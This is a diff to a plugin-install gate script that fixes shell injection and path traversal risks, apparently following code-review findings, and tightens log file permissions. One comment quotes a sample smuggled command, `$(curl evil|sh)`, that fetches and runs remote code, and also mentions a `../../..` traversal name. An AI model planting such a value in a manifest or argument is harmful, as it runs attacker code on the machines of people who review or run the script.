@@ -31,9 +31,28 @@ ROOT=$(pwd)
 
 PLUGIN="${1:-m2ai-workflow-content}"
 MARKET=$(node -e 'console.log(require("./.claude-plugin/marketplace.json").name)')
+
+# Codex r2 HIGH (adopted). MARKET and PLUGIN come from repo JSON / argv and are interpolated into
+# shell words and into a `rm -rf` path below. This repo is PUBLIC and takes PRs, so "the manifest
+# is trusted input" is not a safe assumption: a marketplace name of `$(curl evil|sh)` would run on
+# the host of anyone who reviews the PR by running this gate, and a name of `../../..` would point
+# the cleanup `rm -rf` outside the cache dir entirely. Both are cheap to close and expensive to
+# discover later, so validate the charset before either value is used.
+for _v in "MARKET:$MARKET" "PLUGIN:$PLUGIN"; do
+  _n=${_v%%:*}; _s=${_v#*:}
+  if ! printf '%s' "$_s" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._-]*$'; then
+    echo "FATAL: $_n contains characters that are unsafe to interpolate into a shell command or"
+    echo "       a filesystem path: '$_s'"
+    echo "       Refusing to run rather than executing or deleting something unintended."
+    exit 1
+  fi
+done
 LOG_DIR="$ROOT/.self-healing-claudex"
 [ -d "$LOG_DIR" ] || LOG_DIR=/tmp
 LOG="$LOG_DIR/phase2-gate-$(date -u +%Y%m%dT%H%M%SZ).log"
+# Codex r2 LOW (adopted). The transcript records this machine's installed-plugin inventory, which
+# is not something to hand every local account by default. Create it 0600 BEFORE anything writes.
+( umask 077; : > "$LOG" ) || { echo "FATAL: cannot create log at $LOG"; exit 1; }
 
 pass=0; fail=0
 ok()  { echo "  PASS  $1" | tee -a "$LOG"; pass=$((pass+1)); }
@@ -125,16 +144,30 @@ done < <(find "$CACHE" -name SKILL.md 2>/dev/null)
 
 # Cross-check the installed skill NAMES against the manifest, not just the count: the right
 # number of the wrong skills is still a broken split.
+# Codex r2 HIGH (adopted). This previously built a `find` command by string-interpolating the
+# cache path and ran it through execSync -- i.e. through a SHELL. JSON.stringify only adds double
+# quotes, and `$(...)` still expands inside double quotes, so the quoting was decorative. Walk the
+# tree with fs instead: no shell, no command string, nothing to inject into.
 MISSING=$(node -e '
-  const { execSync } = require("child_process");
+  const fs = require("fs"), path = require("path");
   const m = require("./skills-manifest.json");
   const d2p = {}; for (const p of m.plugins) for (const d of p.divisions) d2p[d] = p.id;
   const want = Object.entries(m.skills).filter(([, d]) => d2p[d] === process.argv[1]).map(([s]) => s);
-  const got = new Set(
-    execSync(`find ${JSON.stringify(process.argv[2])} -name SKILL.md`, { encoding: "utf8" })
-      .split("\n").filter(Boolean)
-      .map((p) => p.split("/skills/")[1]).filter(Boolean).map((p) => p.split("/")[0])
-  );
+  const got = new Set();
+  const walk = (dir) => {
+    let entries; try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
+    for (const e of entries) {
+      const full = path.join(dir, e.name);
+      if (e.isDirectory()) walk(full);
+      else if (e.name === "SKILL.md") {
+        // <...>/skills/<skill>/SKILL.md -- the skill name is the parent dir
+        const parts = full.split(path.sep);
+        const i = parts.lastIndexOf("skills");
+        if (i >= 0 && parts[i + 1]) got.add(parts[i + 1]);
+      }
+    }
+  };
+  walk(process.argv[2]);
   console.log(want.filter((s) => !got.has(s)).join(" "));
 ' "$PLUGIN" "$CACHE" 2>/dev/null)
 [ -z "$MISSING" ] && ok "every manifest skill for $PLUGIN is present in the install" \
